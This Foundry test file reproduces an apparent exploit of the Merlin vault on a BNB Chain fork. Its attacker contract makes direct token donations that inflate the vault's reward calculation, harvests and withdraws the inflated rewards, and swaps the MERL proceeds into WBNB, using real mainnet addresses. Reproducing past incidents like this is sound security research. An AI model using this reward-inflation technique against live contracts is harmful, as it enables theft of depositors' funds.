// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IMerlinVault {
    function deposit(
        uint256 amount
    ) external;
    function harvest() external;
    function getReward() external;
    function withdrawAll() external;
}

interface IMerlinRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWrappedNative is IERC20 {
    function deposit() external payable;
}

contract MerlinAttacker {
    IWrappedNative private constant WBNB = IWrappedNative(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
    IERC20 private constant MERL = IERC20(0xDA360309C59CB8C434b28A91b823344a96444278);

    IMerlinVault private constant VAULT = IMerlinVault(0xFeFFa88E6e3C99937B73faa6f7A770f20b661CbE);
    IMerlinRouter private constant ROUTER = IMerlinRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    receive() external payable {}

    function attack() external {
        WBNB.approve(address(VAULT), type(uint256).max);
        MERL.approve(address(ROUTER), type(uint256).max);

        VAULT.deposit(0.1 ether);

        // Direct donations inflate the vault's reward calculation without
        // increasing the attacker's recorded stake.
        WBNB.transfer(address(VAULT), WBNB.balanceOf(address(this)));
        ALPACA.transfer(address(VAULT), ALPACA.balanceOf(address(this)));

        VAULT.harvest();
        VAULT.getReward();
        VAULT.withdrawAll();

        address[] memory path = new address[](2);
        path[0] = address(MERL);
        path[1] = address(WBNB);
        ROUTER.swapExactTokensForTokens(MERL.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        WBNB.deposit{value: address(this).balance}();
    }
}

contract MerlinExploitTest is Test {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);

    MerlinAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("bsc", 8_713_153);
        attacker = new MerlinAttacker();

        deal(address(WBNB), address(attacker), 332_738_211_092_962_697_232);
        deal(address(ALPACA), address(attacker), 1 ether);
    }

    function testExploit() public {
        uint256 beforeBalance = WBNB.balanceOf(address(attacker));
        attacker.attack();
        assertGt(WBNB.balanceOf(address(attacker)), beforeBalance);
    }
}
